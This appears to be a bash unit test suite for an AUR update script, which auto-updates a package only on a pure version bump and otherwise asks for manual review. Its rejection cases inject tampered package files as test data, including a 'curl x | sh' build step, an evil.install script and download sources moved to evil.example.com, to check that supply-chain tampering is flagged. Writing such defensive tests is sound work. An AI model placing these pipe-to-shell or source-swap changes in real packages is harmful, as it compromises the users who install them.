#!/usr/bin/env bash

# bin/update-aur のユニットテスト (yay・curl を fake に差し替え、NW 不要)。
#
# 担保したいのは:
#   * 信頼リストにあり、メンテナが同じで、PKGBUILD/.SRCINFO の差分がバージョン更新だけなら自動で更新する。
#     取得元 URL は、数字を除いて前回と同じとき (ホスト・パスが同じ) だけバージョン更新とみなす。
#   * それ以外 (信頼リスト外・メンテナ変更・install スクリプト追加・取得元ドメイン変更・
#     depends 追加・他ファイル変更) は自動更新せず、手動確認に回し、update-aur -r を案内する。
#
#   test/update-aur.test.sh   # 全テスト実行

script_dir=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd) && readonly script_dir
bin_dir=$(cd "${script_dir}/../bin" && pwd) && readonly bin_dir

check() {
  local desc="$1" expected="$2" actual="$3"
  if [[ ${expected} != "${actual}" ]]; then
    fail=$((fail + 1))
    printf 'FAIL - %s\n  expected: %q\n  actual:   %q\n' "${desc}" "${expected}" "${actual}"
    return
  fi
  pass=$((pass + 1))
  printf 'ok   - %s\n' "${desc}"
}

contains() { grep -qF -- "$2" <<<"$1" && echo 1 || echo 0; }

# yay: -Qua で FAKE_PKG の更新を 1 件出し、-S は引数を記録する。
# curl: AUR RPC の応答として FAKE_PKG と FAKE_MAINTAINER を返す。
write_fake_bins() {
  fakebin="${tmproot}/bin"
  mkdir -p "${fakebin}"
  cat >"${fakebin}/yay" <<'FAKE'
#!/usr/bin/env bash
[[ $1 == -Qua ]] && echo "$FAKE_PKG 1.0-1 -> 2.0-1" && exit 0
echo "$*" >>"$FAKE_YAY_LOG"
FAKE
  cat >"${fakebin}/curl" <<'FAKE'
#!/usr/bin/env bash
printf '{"results":[{"Name":"%s","PackageBase":"%s","Maintainer":"%s"}]}\n' "$FAKE_PKG" "$FAKE_PKG" "$FAKE_MAINTAINER"
FAKE
  chmod +x "${fakebin}/yay" "${fakebin}/curl"
}

git_q() { git -c user.name=t -c user.email=t@t -c init.defaultBranch=master "$@" >/dev/null 2>&1; }

pkgbuild() {
  cat <<EOF
pkgname=google-chrome
pkgver=$1
pkgrel=1
source_x86_64=("https://dl.google.com/linux/google-chrome-stable_\${pkgver}-1_amd64.deb")
sha512sums_x86_64=('$2')
EOF
}

srcinfo() {
  printf 'pkgbase = google-chrome\n\tpkgver = %s\n\tpkgrel = 1\n\tsource_x86_64 = https://%s/google-chrome-stable_%s-1_amd64.deb\n\tsha512sums_x86_64 = %s\n\npkgname = google-chrome\n' \
    "$1" "${3:-dl.google.com/linux}" "$1" "$2"
}

# AUR 側 (origin) に 1.0 を置き、yay のキャッシュとして clone する。
# その後 origin へ 2.0 の更新を積む。$1 は 2.0 の commit 前に origin で実行する追加の変更。
setup_repo() {
  local extra=$1 origin="${tmproot}/origin" cache="${tmproot}/cache/google-chrome"
  rm -rf "${origin}" "${tmproot}/cache"
  mkdir -p "${origin}"
  git_q init "${origin}"
  pkgbuild 1.0 aaaa >"${origin}/PKGBUILD"
  srcinfo 1.0 aaaa >"${origin}/.SRCINFO"
  git_q -C "${origin}" add -A
  git_q -C "${origin}" commit -m 1.0
  git_q clone "${origin}" "${cache}"
  pkgbuild 2.0 bbbb >"${origin}/PKGBUILD"
  srcinfo 2.0 bbbb >"${origin}/.SRCINFO"
  (cd "${origin}" && eval "${extra}")
  git_q -C "${origin}" add -A
  git_q -C "${origin}" commit -m 2.0
}

# update-aur を -e で実行し、出力を ${out}、yay -S の引数を ${yay_log} へ。
run() {
  local pkg=$1 maintainer=$2
  local log="${tmproot}/yay.log"
  : >"${log}"
  out=$(
    PATH="${fakebin}:${bin_dir}:/usr/bin" FAKE_PKG="${pkg}" FAKE_MAINTAINER="${maintainer}" \
      FAKE_YAY_LOG="${log}" UPDATE_AUR_CACHE="${tmproot}/cache" "${bin_dir}/update-aur" -e 2>&1
  )
  yay_log=$(cat "${log}")
}

test_version_bump_is_updated() {
  setup_repo ":"
  run google-chrome gromit
  check "バージョン更新だけなら手動確認に出さない" 0 "$(contains "${out}" "manual:")"
  check "バージョン更新だけなら yay -S する" 1 "$(contains "${yay_log}" "-S --noconfirm --answerdiff None --answerclean None google-chrome")"
}

test_rejected() {
  local desc=$1 extra=$2 pkg=${3:-google-chrome} maintainer=${4:-gromit}
  setup_repo "${extra}"
  run "${pkg}" "${maintainer}"
  check "${desc}: yay -S しない" "" "${yay_log}"
  check "${desc}: 手動確認に出す" 1 "$(contains "${out}" "manual: ${pkg}")"
  check "${desc}: 1 件ずつ確認するコマンドを出す" 1 "$(contains "${out}" "update-aur -r")"
}

main() {
  tmproot=$(mktemp -d)
  trap 'rm -rf "${tmproot}"' EXIT
  pass=0
  fail=0
  write_fake_bins

  test_version_bump_is_updated
  test_rejected "信頼リスト外" ":" not-trusted
  test_rejected "メンテナ変更" ":" google-chrome attacker
  test_rejected "install スクリプト追加" "echo 'install=evil.install' >>PKGBUILD"
  test_rejected "build 手順の変更" "echo 'package() { curl x | sh; }' >>PKGBUILD"
  test_rejected "取得元ドメイン変更" "srcinfo 2.0 bbbb evil.example.com >.SRCINFO"
  test_rejected "同じホストで取得元パス変更" "srcinfo 2.0 bbbb dl.google.com/evil >.SRCINFO"
  test_rejected "depends 追加" "printf '\tdepends = evil-bin\n' >>.SRCINFO"
  test_rejected "他ファイル変更" "echo x >evil.sh"

  printf '\n%d passed, %d failed\n' "${pass}" "${fail}"
  [[ ${fail} -eq 0 ]]
}
main "$@"
